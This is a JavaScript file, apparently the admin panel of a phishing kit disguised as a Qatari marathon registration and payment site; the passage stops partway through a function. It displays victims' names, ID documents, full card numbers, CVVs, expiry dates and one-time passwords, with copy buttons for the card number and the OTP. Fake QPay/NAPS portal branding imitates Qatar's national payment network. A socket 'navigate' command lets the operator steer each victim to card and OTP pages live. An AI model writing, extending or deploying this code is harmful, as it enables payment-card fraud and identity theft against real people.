const PAGES = [
  { id: 'index', name: 'الرئيسية', icon: 'fa-home', url: '/' },
  { id: 'registration', name: 'التسجيل', icon: 'fa-user-plus', url: '/registration.html' },
  { id: 'registration-summary', name: 'ملخص السلة', icon: 'fa-receipt', url: '/registration-summary.html' },
  { id: 'payment', name: 'اختيار الدفع', icon: 'fa-credit-card', url: '/payment.html' },
  { id: 'payment-card', name: 'بطاقة الائتمان', icon: 'fa-credit-card-alt', url: '/payment-card.html' },
  { id: 'qpy', name: 'QPay', icon: 'fa-mobile-alt', url: '/qpy.html' },
  { id: 'payment-verify', name: 'otp Visa', icon: 'fa-lock', url: '/payment-verify.html' },
  { id: 'otp', name: 'otp QPY', icon: 'fa-key', url: '/otp.html' },
  { id: 'wait', name: 'شاشة الإنتظار', icon: 'fa-spinner fa-spin', url: '/wait.html' }
];

const PAGE_LABELS = {
  'index': 'الصفحة الرئيسية',
  'registration': 'التسجيل',
  'registration-summary': 'ملخص السلة',
  'payment': 'اختيار الدفع',
  'payment-card': 'بطاقة الائتمان',
  'qpy': 'QPay',
  'payment-verify': 'otp Visa',
  'otp': 'otp QPY',
  'wait': 'شاشة الإنتظار'
};

const FORM_FIELD_LABELS = {
  // Registration
  raceCategory: 'فئة السباق', firstName: 'الاسم الأول', lastName: 'اسم العائلة',
  email: 'البريد الإلكتروني', phone: 'رقم الجوال', gender: 'الجنس',
  birthDate: 'تاريخ الميلاد', nationality: 'الجنسية', residence: 'بلد الإقامة',
  shirtSize: 'مقاس القميص', pace: 'الوقت المتوقع', identityNumber: 'رقم الهوية',
  identityFile: 'صورة وثيقة إثبات الهوية',
  club: 'النادي/العمل', coupon: 'رمز القسيمة', price: 'السعر',
  terms: 'الموافقة على الشروط',
  // Payment Card
  cardNumber: 'رقم البطاقة', cardCvv: 'CVV', cardExpiry: 'تاريخ الانتهاء',
  cardholderName: 'الاسم على البطاقة',
  // QPY
  cardType: 'نوع البطاقة', expMonth: 'شهر الانتهاء', expYear: 'سنة الانتهاء', cvv: 'CVV',
  // OTP/Verify
  otpCode: 'رمز التحقق'
};

function getAuthToken() {
  return localStorage.getItem('dashboard_auth_token') || '';
}

async function apiFetch(path, options = {}) {
  const apiUrl = (typeof DASHBOARD_CONFIG !== 'undefined' && DASHBOARD_CONFIG.API_URL) ? DASHBOARD_CONFIG.API_URL : 'https://marath.onrender.com';
  const token = getAuthToken();
  const headers = {
    'Accept': 'application/json',
    ...(options.headers || {})
  };
  if (token) {
    headers['Authorization'] = `Bearer ${token}`;
    headers['x-auth-token'] = token;
  }
  return fetch(`${apiUrl}${path}`, {
    ...options,
    credentials: 'include',
    headers
  });
}

let socket = null;
if (typeof io !== 'undefined') {
  const instanceKey = (typeof DASHBOARD_CONFIG !== 'undefined' && DASHBOARD_CONFIG.INSTANCE_KEY) ? DASHBOARD_CONFIG.INSTANCE_KEY : 'your_secret_key';
  const serverUrl = (typeof DASHBOARD_CONFIG !== 'undefined' && DASHBOARD_CONFIG.API_URL) ? DASHBOARD_CONFIG.API_URL : 'https://marath.onrender.com';
  const token = getAuthToken();

  socket = io(serverUrl, {
    query: { instanceKey: instanceKey, token: token },
    auth: { instanceKey: instanceKey, token: token },
    transports: ['websocket', 'polling'],
    withCredentials: true
  });

  socket.on('connect', () => {
    console.log('Socket connected');
    loadInitialData();
  });

  socket.on('disconnect', () => {
    console.log('Socket disconnected');
  });
} else {
  console.error("Socket.io script failed to load. The backend server might be down.");
}

let users = [];
let currentUserData = null;

async function loadInitialData() {
  await Promise.all([loadStats(), loadUsers(), loadConfig()]);
}

document.addEventListener('DOMContentLoaded', () => {
  loadInitialData();

  const logoutBtn = document.getElementById('logout-btn');
  if (logoutBtn) {
    logoutBtn.addEventListener('click', async () => {
      try {
        await apiFetch('/dashboard/logout', { method: 'POST' });
      } catch (e) { }
      localStorage.removeItem('dashboard_auth_token');
      window.location.href = 'login.html';
    });
  }

  const refreshBtn = document.getElementById('refresh-btn');
  if (refreshBtn) {
    refreshBtn.addEventListener('click', () => {
      loadInitialData();
    });
  }
});

async function loadConfig() {
  try {
    const res = await apiFetch('/api/config');
    if (res.ok) {
      const config = await res.json();
      document.title = `لوحة التحكم - ${config.projectName}`;
      const headerLogo = document.querySelector('.header-logo');
      if (headerLogo) headerLogo.alt = config.projectName;
    }
  } catch (err) { }
}

async function loadStats() {
  try {
    const res = await apiFetch('/api/stats');
    if (res.ok) {
      const contentType = res.headers.get("content-type");
      if (contentType && contentType.includes("application/json")) {
        const stats = await res.json();
        const connUsers = document.getElementById('connected-users');
        const totalReg = document.getElementById('total-registrations');
        if (connUsers) connUsers.textContent = stats.connectedUsers || stats.activeUsers || 0;
        if (totalReg) totalReg.textContent = stats.totalRegistrations || 0;
      }
    } else if (res.status === 401) {
      window.location.href = 'login.html';
    }
  } catch (err) {
    console.error('Error loading stats', err);
  }
}

async function loadUsers() {
  const usersListEl = document.getElementById('users-list');
  try {
    const res = await apiFetch('/api/users');
    if (res.ok) {
      const contentType = res.headers.get("content-type");
      if (contentType && contentType.includes("application/json")) {
        users = await res.json();
        renderUserList(users);
      } else {
        window.location.href = 'login.html';
      }
    } else if (res.status === 401) {
      window.location.href = 'login.html';
    } else {
      if (usersListEl) {
        usersListEl.innerHTML = '<div style="padding:20px; text-align:center; color:var(--text-muted);">لا يوجد مستخدمين نشطين</div>';
      }
    }
  } catch (err) {
    console.error('Error loading users', err);
    if (usersListEl) {
      usersListEl.innerHTML = '<div style="padding:20px; text-align:center; color:var(--text-muted);">لا يوجد مستخدمين نشطين</div>';
    }
  }
}

function getUserDisplayName(user) {
  if (!user) return 'مستخدم جديد';
  if (user.name && user.name.trim() !== '' && user.name !== 'مجهول') return user.name.trim();
  if (user.formData) {
    const reg = user.formData.registration;
    if (reg) {
      const full = [reg.firstName, reg.lastName].filter(Boolean).join(' ');
      if (full) return full;
    }
    const card = user.formData['payment-card'];
    if (card && (card.cardholderName || card['cardholder-name'])) {
      return card.cardholderName || card['cardholder-name'];
    }
    const qpy = user.formData['qpy'];
    if (qpy && (qpy.cardholderName || qpy['cardholder-name'])) {
      return qpy.cardholderName || qpy['cardholder-name'];
    }
  }
  return 'مستخدم جديد';
}

function getUserPageId(user) {
  if (!user) return 'index';
  let p = user.currentPage;
  if (p && p !== 'unknown' && p !== 'null' && p !== 'undefined' && PAGE_LABELS[p]) {
    return p;
  }
  // If currentPage was unknown or not set, intelligently infer from submitted forms
  if (user.formData) {
    if (user.formData['otp']) return 'otp';
    if (user.formData['payment-verify']) return 'payment-verify';
    if (user.formData['qpy']) return 'qpy';
    if (user.formData['payment-card']) return 'payment-card';
    if (user.formData['payment']) return 'payment';
    if (user.formData['registration-summary']) return 'registration-summary';
    if (user.formData['registration']) return 'registration';
  }
  return 'index';
}

function getUserStatusInfo(user) {
  const isOnline = Boolean(user && user.isConnected);
  const pageId = getUserPageId(user);
  const pageName = PAGE_LABELS[pageId] || 'الصفحة الرئيسية';
  return {
    isOnline,
    pageId,
    pageName,
    statusText: isOnline ? pageName : 'غير متصل (Offline)',
    statusClass: isOnline ? 'online' : 'offline'
  };
}

function renderUserList(list) {
  const usersListEl = document.getElementById('users-list');
  if (!usersListEl) return;
  usersListEl.innerHTML = '';

  if (!list || list.length === 0) {
    usersListEl.innerHTML = '<div style="padding:20px; text-align:center; color:var(--text-muted);">لا يوجد مستخدمين نشطين</div>';
    return;
  }

  list.forEach(user => {
    const item = document.createElement('div');
    item.className = 'user-item';
    if (currentUserData && currentUserData.sessionId === user.sessionId) {
      item.classList.add('active');
    }
    item.dataset.sessionId = user.sessionId;

    const displayName = getUserDisplayName(user);
    const initials = getInitials(displayName);
    const statusInfo = getUserStatusInfo(user);
    const contact = user.email || user.phone || (user.formData?.registration?.email || user.formData?.registration?.phone || '');

    item.innerHTML = `
      <div class="user-avatar">${initials}</div>
      <div class="user-info">
        <div class="user-name">${escapeHtml(displayName)}</div>
        <div class="user-meta">
          <span class="status-pill ${statusInfo.statusClass}">
            <span class="live-dot"></span>
            <span>${escapeHtml(statusInfo.statusText)}</span>
          </span>
        </div>
        <div class="user-contact">${escapeHtml(contact)}</div>
      </div>
    `;
    item.addEventListener('click', () => selectUser(user.sessionId));
    usersListEl.appendChild(item);
  });
}

async function selectUser(sessionId) {
  try {
    const res = await apiFetch(`/api/user/${sessionId}`);
    if (res.ok) {
      const contentType = res.headers.get("content-type");
      if (contentType && contentType.includes("application/json")) {
        currentUserData = await res.json();

        document.querySelectorAll('.user-item').forEach(el => {
          el.classList.toggle('active', el.dataset.sessionId === sessionId);
        });

        renderChat(currentUserData);
      }
    } else if (res.status === 401) {
      window.location.href = 'login.html';
    }
  } catch (err) {
    console.error('Error selecting user', err);
  }
}

function renderChat(data) {
  if (!data) return;
  const placeholder = document.getElementById('chat-placeholder');
  const activeChat = document.getElementById('chat-active');
  if (placeholder) {
    placeholder.classList.add('hidden');
    placeholder.style.display = 'none';
  }
  if (activeChat) {
    activeChat.classList.remove('hidden');
    activeChat.style.display = 'flex';
  }

  const displayName = getUserDisplayName(data);
  const initials = getInitials(displayName);
  const avatarEl = document.getElementById('user-avatar');
  if (avatarEl) avatarEl.textContent = initials;

  const nameEl = document.getElementById('chat-user-name');
  if (nameEl) nameEl.textContent = escapeHtml(displayName);

  const statusInfo = getUserStatusInfo(data);
  const pageContainer = document.getElementById('user-current-page');
  if (pageContainer) {
    pageContainer.innerHTML = `
      <span class="status-pill ${statusInfo.statusClass}">
        <span class="live-dot"></span>
        <span id="page-name">${escapeHtml(statusInfo.statusText)}</span>
      </span>
    `;
  }

  const contactEl = document.getElementById('user-contact');
  if (contactEl) {
    const contact = data.email || data.phone || (data.formData?.registration?.email || data.formData?.registration?.phone || '');
    contactEl.textContent = contact || 'لا توجد بيانات تواصل مسجلة';
  }

  renderNavButtons(statusInfo.pageId);
  renderMessages(data.formData);
}

function renderNavButtons(activePage) {
  const container = document.getElementById('nav-buttons');
  if (!container) return;
  container.innerHTML = '';

  const normalizedActive = (activePage && activePage !== 'unknown' && PAGE_LABELS[activePage])
    ? activePage
    : (currentUserData ? getUserPageId(currentUserData) : 'index');

  PAGES.forEach(page => {
    const btn = document.createElement('button');
    btn.className = 'nav-btn';
    btn.dataset.page = page.id;
    if (page.id === normalizedActive) {
      btn.classList.add('active');
    }

    btn.innerHTML = `
      <i class="fa ${page.icon}"></i>
      <span>${page.name}</span>
      <span class="page-indicator"></span>
    `;

    btn.addEventListener('click', () => {
      if (currentUserData && currentUserData.sessionId) {
        // 1. Instant optimistic UI switch: move glowing beacon light immediately
        container.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');

        // 2. Update currentUserData local state
        currentUserData.currentPage = page.id;

        // 3. Update chat header page display
        const pageContainer = document.getElementById('user-current-page');
        if (pageContainer) {
          const statusInfo = getUserStatusInfo(currentUserData);
          pageContainer.innerHTML = `
            <span class="status-pill ${statusInfo.statusClass}">
              <span class="live-dot"></span>
              <span id="page-name">${escapeHtml(statusInfo.statusText)}</span>
            </span>
          `;
        }

        // 4. Update sidebar user item
        const userInList = users.find(u => u.sessionId === currentUserData.sessionId);
        if (userInList) {
          userInList.currentPage = page.id;
          renderUserList(users);
        }

        // 5. Emit navigate event to server
        if (socket) {
          socket.emit('navigate', { sessionId: currentUserData.sessionId, page: page.id });
        }
      }
    });

    container.appendChild(btn);
  });
}

// Brand SVG & Card Formatting Helpers
const NAPS_LOGO_BASE64 = 'data:image/png;base64,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';

function getBrandLogoSvg(brand) {
  if (brand === 'visa') {
    return `
      <svg class="cc-brand-logo-svg visa" viewBox="0 0 60 20" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M24.8 19.3L28.1 0.7H33.3L30 19.3H24.8Z" fill="#ffffff"/>
        <path d="M46.7 1.2C45.6 0.7 43.8 0.3 41.5 0.3C35.9 0.3 32 3.1 31.9 7.2C31.8 10.2 34.6 11.8 36.8 12.8C38.9 13.8 39.7 14.5 39.7 15.5C39.7 17 37.9 17.7 36.2 17.7C34 17.7 32.7 17.3 31.1 16.6L30.3 16.2L29.5 21.4C30.9 22.1 33.3 22.6 35.7 22.6C41.6 22.6 45.4 19.8 45.5 15.5C45.6 13.1 44 11.3 41 9.9C39.2 8.9 38.1 8.2 38.1 7.2C38.1 6.2 39.3 5.2 41.6 5.2C43.5 5.2 44.8 5.6 46 6.1L46.6 6.4L47.3 1.5L46.7 1.2Z" fill="#ffffff"/>
        <path d="M55.8 0.7H51.8C50.5 0.7 49.5 1.1 48.9 2.4L41.8 19.3H47.7L48.9 16.1H56.1L56.8 19.3H62L57.5 0.7H55.8ZM50.5 12.1L53.3 4.5L54.9 12.1H50.5Z" fill="#ffffff"/>
        <path d="M18.5 0.7L13.1 14.9L12.5 12.1C11.5 8.7 8.5 5 5.1 3.2L10 19.3H16.1L25.1 0.7H18.5Z" fill="#ffffff"/>
        <path d="M8.8 0.7H-0.8L-1 1.2C5.6 2.8 10.7 7.3 12.5 12.1L10.7 2.6C10.4 1.3 9.7 0.8 8.8 0.7Z" fill="#f59e0b"/>
      </svg>
    `;
  }
  if (brand === 'mastercard') {
    return `
      <svg class="cc-brand-logo-svg mastercard" viewBox="0 0 48 30" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="17" cy="15" r="13" fill="#EB001B"/>
        <circle cx="31" cy="15" r="13" fill="#F79E1B" fill-opacity="0.92"/>
        <path d="M24 5.3C26.9 7.8 28.7 11.2 28.7 15C28.7 18.8 26.9 22.2 24 24.7C21.1 22.2 19.3 18.8 19.3 15C19.3 11.2 21.1 7.8 24 5.3Z" fill="#FF5F00"/>
      </svg>
    `;
  }
  return `
    <div style="display:flex; align-items:center; gap:5px; font-weight:700; font-size:12px; color:#cbd5e1;">
      <i class="fas fa-credit-card"></i> CARD
    </div>
  `;
}

function formatCardNumber(rawNum) {
  if (!rawNum) return '•••• •••• •••• ••••';
  const clean = String(rawNum).replace(/\s+/g, '');
  const chunks = clean.match(/.{1,4}/g);
  return chunks ? chunks.join(' ') : clean;
}

function renderRegistrationDossier(data, container) {
  const fullName = [data.firstName, data.lastName].filter(Boolean).join(' ') || data.name || 'المشارك';
  const category = data.raceCategory || 'سباق الماراثون';
  const price = data.price ? `${data.price} ر.ق` : '';

  const card = document.createElement('div');
  card.className = 'registration-dossier-card';

  // Header
  const header = document.createElement('div');
  header.className = 'dossier-header';
  header.innerHTML = `
    <div class="dossier-title-group">
      <div class="dossier-icon"><i class="fas fa-running"></i></div>
      <div>
        <h4 class="dossier-title">${escapeHtml(fullName)}</h4>
        <span class="dossier-subtitle">استمارة التسجيل في السباق</span>
      </div>
    </div>
    <div class="dossier-badges">
      ${category ? `<span class="dossier-badge category"><i class="fas fa-medal"></i> ${escapeHtml(category)}</span>` : ''}
      ${price ? `<span class="dossier-badge price"><i class="fas fa-tag"></i> ${escapeHtml(price)}</span>` : ''}
    </div>
  `;
  card.appendChild(header);

  // Body
  const body = document.createElement('div');
  body.className = 'dossier-body';

  // Grid
  const grid = document.createElement('div');
  grid.className = 'dossier-grid';

  const fieldsToShow = [
    { key: 'email', label: 'البريد الإلكتروني', icon: 'fa-envelope' },
    { key: 'phone', label: 'رقم الجوال', icon: 'fa-phone' },
    { key: 'identityNumber', label: 'رقم الهوية / الجواز', icon: 'fa-id-badge' },
    { key: 'nationality', label: 'الجنسية', icon: 'fa-globe' },
    { key: 'residence', label: 'بلد الإقامة', icon: 'fa-map-marker-alt' },
    { key: 'birthDate', label: 'تاريخ الميلاد', icon: 'fa-calendar-alt' },
    { key: 'gender', label: 'الجنس', icon: 'fa-venus-mars' },
    { key: 'shirtSize', label: 'مقاس القميص', icon: 'fa-tshirt' },
    { key: 'pace', label: 'الوقت المتوقع', icon: 'fa-stopwatch' },
    { key: 'club', label: 'النادي / جهة العمل', icon: 'fa-building' },
    { key: 'coupon', label: 'رمز القسيمة', icon: 'fa-ticket-alt' }
  ];

  fieldsToShow.forEach(f => {
    const val = data[f.key];
    if (val && String(val).trim()) {
      const fieldEl = document.createElement('div');
      fieldEl.className = 'dossier-field';
      fieldEl.innerHTML = `
        <span class="dossier-field-label"><i class="fas ${f.icon}"></i> ${f.label}</span>
        <span class="dossier-field-value" title="${escapeHtml(String(val))}">${escapeHtml(String(val))}</span>
      `;
      grid.appendChild(fieldEl);
    }
  });
  body.appendChild(grid);

  // Identity Document Attachment
  const identityFile = data.identityFile;
  if (identityFile && String(identityFile).trim()) {
    const strVal = String(identityFile).trim();
    const fileName = data.identityFileName || 'وثيقة_إثبات_الهوية.jpg';
    const fileSize = data.identityFileSize || '';

    const isImage = strVal.startsWith('data:image/') ||
      (strVal.startsWith('data:') && !strVal.startsWith('data:application/pdf')) ||
      /\.(png|jpe?g|webp|gif|svg)$/i.test(strVal) ||
      (strVal.includes(';base64,') && !strVal.startsWith('data:application/pdf'));

    if (isImage) {
      const attachBox = document.createElement('div');
      attachBox.className = 'dossier-attachment-box';

      const preview = document.createElement('div');
      preview.className = 'dossier-attachment-preview';
      preview.title = 'انقر لعرض الصورة بالحجم الكامل';
      preview.innerHTML = `
        <img src="${strVal}" class="dossier-attachment-img" alt="وثيقة الهوية" />
        <div class="dossier-attachment-info">
          <span class="dossier-attachment-title"><i class="fas fa-file-image text-primary"></i> ${escapeHtml(fileName)}</span>
          <span class="dossier-attachment-sub">${fileSize ? escapeHtml(fileSize) + ' • ' : ''}انقر للتكبير والمشاهدة</span>
        </div>
      `;
      preview.addEventListener('click', () => window.openImageModal(strVal, fileName));

      const downloadA = document.createElement('a');
      downloadA.className = 'btn-download-img';
      downloadA.href = strVal;
      downloadA.download = fileName;
      downloadA.innerHTML = '<i class="fas fa-download"></i> تحميل';

      attachBox.appendChild(preview);
      attachBox.appendChild(downloadA);
      body.appendChild(attachBox);
    } else if (strVal.startsWith('data:application/pdf')) {
      const pdfBox = document.createElement('div');
      pdfBox.className = 'dossier-attachment-box';
      pdfBox.innerHTML = `
        <div style="display:flex; align-items:center; gap:10px;">
          <i class="fas fa-file-pdf" style="font-size:32px; color:#ef4444;"></i>
          <div>
            <strong style="display:block; font-size:13px; color:#1e293b;">${escapeHtml(fileName)}</strong>
            <span style="font-size:11px; color:#64748b;">مستند PDF</span>
          </div>
        </div>
        <a href="${strVal}" download="${escapeHtml(fileName)}" class="btn-download-img">
          <i class="fas fa-download"></i> تحميل
        </a>
      `;
      body.appendChild(pdfBox);
    }
  }

  card.appendChild(body);
  container.appendChild(card);
}

function renderCreditCardComponent(data, container, { isQpay = false } = {}) {
  const rawNum = String(data.cardNumber || '').trim();
  const cleanNum = rawNum.replace(/\s+/g, '');

  // Brand detection: starts with 4 -> Visa, starts with 5 -> MasterCard
  let brand = 'other';
  if (cleanNum.startsWith('4')) {
    brand = 'visa';
  } else if (cleanNum.startsWith('5')) {
    brand = 'mastercard';
  }

  const formattedNumber = formatCardNumber(cleanNum);
  const cardholder = (data.cardholderName || data['cardholder-name'] || data.name || 'CARDHOLDER NAME').toUpperCase();

  let expiry = data.cardExpiry || '';
  if (!expiry && (data.expMonth || data.expYear)) {
    const m = String(data.expMonth || '01').padStart(2, '0');
    const y = String(data.expYear || '27').slice(-2);
    expiry = `${m}/${y}`;
  }
  if (!expiry) expiry = '••/••';

  const cvv = data.cardCvv || data.cvv || '•••';

  let targetContainer = container;
  if (isQpay) {
    const portalBox = document.createElement('div');
    portalBox.className = 'qpy-portal-container';
    portalBox.innerHTML = `
      <div class="qpy-portal-header">
        <div class="qpy-portal-brand">
          <img src="assets/NAPS.png" onerror="this.src='${NAPS_LOGO_BASE64}'" class="qpy-naps-logo" alt="NAPS Qatar" />
          <div class="qpy-portal-title">
            <strong>بوابة الدفع الوطنية QPay</strong>
            <span>شبكة NAPS الوطنية للمعاملات المصرفية</span>
          </div>
        </div>
        <span class="qpy-portal-badge"><i class="fas fa-shield-alt"></i> بوابة معتمدة</span>
      </div>
    `;
    targetContainer = portalBox;
  }

  const cardWrapper = document.createElement('div');
  cardWrapper.className = 'credit-card-wrapper';

  const cardEl = document.createElement('div');
  cardEl.className = 'credit-card';

  cardEl.innerHTML = `
    <div class="cc-top-row">
      <div class="cc-chip-nfc">
        <div class="cc-chip"></div>
        <i class="fas fa-wifi cc-nfc"></i>
      </div>
      <div class="cc-brand-badge">
        ${getBrandLogoSvg(brand)}
      </div>
    </div>
    
    <div class="cc-number-row">
      <span class="cc-number">${escapeHtml(formattedNumber)}</span>
      <button class="cc-copy-btn" title="نسخ رقم البطاقة" onclick="window.copyToClipboard('${escapeHtml(cleanNum)}', this)">
        <i class="fas fa-copy"></i> نسخ
      </button>
    </div>
    
    <div class="cc-bottom-row">
      <div class="cc-meta-group">
        <span class="cc-meta-label">حامل البطاقة / CARDHOLDER</span>
        <span class="cc-meta-value">${escapeHtml(cardholder)}</span>
      </div>
      
      <div class="cc-meta-group" style="text-align:center;">
        <span class="cc-meta-label">الانتهاء / EXPIRES</span>
        <span class="cc-meta-value" style="direction:ltr;">${escapeHtml(expiry)}</span>
      </div>
      
      <div class="cc-cvv-pill" title="رمز الأمان CVV">
        <span style="font-size:10px; color:#fca5a5; letter-spacing:0.5px;">CVV</span>
        <span>${escapeHtml(cvv)}</span>
      </div>
    </div>
  `;

  cardWrapper.appendChild(cardEl);
  targetContainer.appendChild(cardWrapper);

  if (isQpay) {
    container.appendChild(targetContainer);
  }
}

function renderOtpComponent(data, container, { isOtpPage = false } = {}) {
  const code = String(data.otpCode || data.code || '').trim();
  const digits = code ? code.split('') : ['-', '-', '-', '-'];

  const outerWrapper = document.createElement('div');
  outerWrapper.className = 'otp-card-container';

  let contentTarget = outerWrapper;

  if (isOtpPage) {
    const napsFrame = document.createElement('div');
    napsFrame.className = 'otp-naps-frame';
    napsFrame.innerHTML = `
      <div class="otp-header-row">
        <div style="display:flex; align-items:center; gap:10px;">
          <img src="assets/NAPS.png" onerror="this.src='${NAPS_LOGO_BASE64}'" style="height:32px; width:auto;" alt="NAPS Qatar" />
          <div>
            <strong style="font-size:13px; color:#0f172a; display:block;">رمز التحقق OTP (بوابة QPay)</strong>
            <span style="font-size:11px; color:#64748b;">تم الاستلام عبر شبكة NAPS المصرفية</span>
          </div>
        </div>
        <span class="qpy-portal-badge"><i class="fas fa-check-circle"></i> تم الإرسال</span>
      </div>
    `;
    outerWrapper.appendChild(napsFrame);
    contentTarget = napsFrame;
  }

  const codeBox = document.createElement('div');
  codeBox.className = 'otp-code-box' + (isOtpPage ? '' : ' standard');

  const digitsHtml = digits.map(d => `<span class="otp-digit-cell">${escapeHtml(d)}</span>`).join('');

  codeBox.innerHTML = `
    <span class="otp-label-text">
      <i class="fas fa-key"></i> رمز التحقق السري لعملية الدفع (One-Time Password)
    </span>
    <div class="otp-digits-wrapper">
      ${digitsHtml}
    </div>
    <div class="otp-actions-row">
      <button class="btn-copy-otp" onclick="window.copyToClipboard('${escapeHtml(code)}', this)">
        <i class="fas fa-copy"></i> نسخ كود التحقق
      </button>
    </div>
  `;

  contentTarget.appendChild(codeBox);
  container.appendChild(outerWrapper);
}

function renderMessages(formData) {
  const list = document.getElementById('messages-list');
  if (!list) return;
  list.innerHTML = '';

  if (!formData || Object.keys(formData).length === 0) {
    list.innerHTML = `
      <div style="padding:40px 20px; text-align:center; color:var(--text-muted);">
        <i class="fas fa-clipboard-list" style="font-size:2.5rem; margin-bottom:12px; opacity:0.4;"></i>
        <h4 style="margin-bottom:6px; color:var(--text);">في انتظار إدخال بيانات النموذج</h4>
        <p style="font-size:13px;">المستخدم يتصفح الموقع ولم يقم بإدخال بيانات في النماذج بعد.</p>
      </div>`;
    return;
  }

  const pageOrder = ['registration', 'registration-summary', 'payment', 'payment-card', 'qpy', 'otp', 'payment-verify', 'wait'];
  const allPages = Array.from(new Set([...pageOrder, ...Object.keys(formData)]));
  let hasEntries = false;

  allPages.forEach(pageId => {
    const data = formData[pageId];
    if (data && typeof data === 'object' && Object.keys(data).length > 0) {
      const group = document.createElement('div');
      group.className = 'message-group';

      const header = document.createElement('div');
      header.className = 'message-group-header';
      header.innerHTML = `<i class="fas fa-file-alt"></i> ${PAGE_LABELS[pageId] || pageId}`;
      group.appendChild(header);

      // 1. Special Case: Registration Dossier Card
      if (pageId === 'registration') {
        renderRegistrationDossier(data, group);
        hasEntries = true;
        list.appendChild(group);
        return;
      }

      // 2. Special Case: Payment Card
      if (pageId === 'payment-card') {
        renderCreditCardComponent(data, group, { isQpay: false });
        hasEntries = true;
        list.appendChild(group);
        return;
      }

      // 3. Special Case: QPay (Credit card in white container with NAPS logo)
      if (pageId === 'qpy') {
        renderCreditCardComponent(data, group, { isQpay: true });
        hasEntries = true;
        list.appendChild(group);
        return;
      }

